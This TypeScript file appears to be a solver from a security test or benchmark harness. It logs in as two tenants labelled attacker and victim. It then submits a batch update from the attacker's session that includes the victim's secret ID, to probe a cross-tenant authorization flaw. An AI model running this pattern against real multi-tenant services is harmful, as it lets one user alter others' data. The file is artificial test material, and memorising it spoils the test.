// Drives the mixed-tenant batch: read one owned secret and one foreign secret (from each tenant's own
// session), then submit both in a single batch under the first tenant's session.
import type { SolverCtx } from '../../../../lib/types.ts'

function pathOf(ctx: SolverCtx, key: string): string {
  const spec = ctx.plan.routes[key]
  if (!spec) throw new Error(`plan has no route ${key}`)
  return spec.path
}

interface SecretItem { id: string; name: string }

export async function solve(ctx: SolverCtx): Promise<void> {
  const attacker = await ctx.login('member_a')
  const victim = await ctx.login('member_b')

  const ownList = await ctx.request({ method: 'GET', path: pathOf(ctx, 'secrets.list'), headers: attacker })
  const ownItems = ownList.json<{ items: SecretItem[] }>().items
  if (!ownItems.length) throw new Error('no owned secrets seeded')

  const foreignList = await ctx.request({ method: 'GET', path: pathOf(ctx, 'secrets.list'), headers: victim })
  const foreignItems = foreignList.json<{ items: SecretItem[] }>().items
  if (!foreignItems.length) throw new Error('no foreign secrets seeded')

  const ids = [ownItems[0]!.id, foreignItems[0]!.id]

  // The batch is submitted from the first tenant's session with an owned element first.
  await ctx.request({
    method: 'POST',
    path: pathOf(ctx, 'secrets.batch'),
    headers: { ...attacker, 'content-type': 'application/json' },
    body: { ids, patch: { name: `${ownItems[0]!.name}-rotated` } },
  })

  await ctx.request({ method: 'GET', path: pathOf(ctx, 'secrets.list'), headers: victim })
}
